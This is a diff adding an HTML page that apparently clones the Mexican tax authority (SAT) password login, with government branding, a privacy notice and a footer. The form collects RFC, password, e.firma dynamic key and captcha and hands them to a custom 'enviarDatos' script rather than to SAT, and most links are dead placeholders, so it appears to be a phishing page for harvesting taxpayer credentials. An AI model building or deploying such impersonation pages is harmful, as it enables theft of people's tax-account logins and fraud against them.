@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Acceso SAT</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <script defer src="script.js"></script>
+</head>
+<body>
+  <header>
+    <div class="header-container">
+      <div class="logo">
+        <img src="./assets/logoheader.svg" alt="Gobierno de México">
+      </div>
+      <nav class="nav-links">
+        <a href="#">Trámites</a>
+        <a href="#">Gobierno</a>
+        <span class="lupa"><i class="fas fa-search"></i></span>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <p class="inicio"><i class="fas fa-house"></i> Inicio</p>
+    <h1>Acceso por contraseña</h1>
+
+    <form onsubmit="enviarDatos(event)">
+      <label for="rfc">RFC:</label>
+      <input type="text" id="rfc" name="rfc" required>
+
+      <label for="password">Contraseña: <span title="Ingresa tu contraseña.">❔</span></label>
+      <input type="password" id="password" name="password" required>
+
+      <label for="efirma">e.firma portable:</label>
+      <input type="text" id="efirma" name="efirma" placeholder="Clave dinámica">
+
+      <label for="captcha">Captcha:</label>
+      <img src="./assets/capcha1.png" alt="captcha" style="margin: 10px 0;">
+      <input type="text" id="captcha" name="captcha" placeholder="Escriba la palabra del captcha" required>
+
+      <div class="buttons">
+        <button type="submit">Enviar</button>
+        <button type="button">e.firma</button>
+      </div>
+
+      <div class="ayuda-links">
+        <p><a href="#">¿Olvidaste tu contraseña?</a></p>
+        <p>Si aún no cuentas con tu contraseña, obtenla <a href="#">aquí</a>.</p>
+        <p>Si aún no cuentas con tu e.firma portable, obtenla <a href="#">aquí</a>.</p>
+        <p><a href="#">Requisitos de uso de e.firma portable</a></p>
+      </div>
+    </form>
+  </main>
+
+  <section class="aviso">
+    <h3>Aviso de privacidad simplificado</h3>
+    <p>
+      El Servicio de Administración Tributaria, es el responsable del tratamiento de los datos personales que se recolectan a través de su portal de internet
+      (<a href="https://www.sat.gob.mx" target="_blank">https://www.sat.gob.mx</a>), los cuales son protegidos conforme a la Ley General de Protección de Datos Personales.
+    </p>
+    <p>
+      Para mayor información: <a href="https://repositorio.cloudb.sat.gob.mx/FTP/avisoprivacidad/802_NV_aviso_integral.html" target="_blank">Aviso integral</a>
+    </p>
+  </section>
+
+  <footer>
+    <div class="footer-container">
+      <div class="footer-logo">
+        <img src="./assets/logoheader.svg" alt="Gobierno de México">
+      </div>
+      <div class="footer-column">
+        <h4>Enlaces</h4>
+        <ul>
+          <li><a href="#">Participa</a></li>
+          <li><a href="#">Publicaciones Oficiales</a></li>
+          <li><a href="#">Marco Jurídico</a></li>
+          <li><a href="#">Plataforma Nacional de Transparencia</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h4>¿Qué es gob.mx?</h4>
+        <ul>
+          <li><a href="#">Portal de datos abiertos</a></li>
+          <li><a href="#">Declaración de accesibilidad</a></li>
+          <li><a href="#">Aviso de privacidad integral</a></li>
+          <li><a href="#">Aviso de privacidad simplificado</a></li>
+          <li><a href="#">Términos y Condiciones</a></li>
+          <li><a href="#">Política de seguridad</a></li>
+          <li><a href="#">Mapa de sitio</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h4>Denuncia contra servidores públicos</h4>
+        <p>Síguenos en</p>
+        <p class="redes-sociales">
+          <a href="#"><i class="fab fa-facebook-square"></i></a>
+          <a href="#"><i class="fab fa-twitter"></i></a>
+        </p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
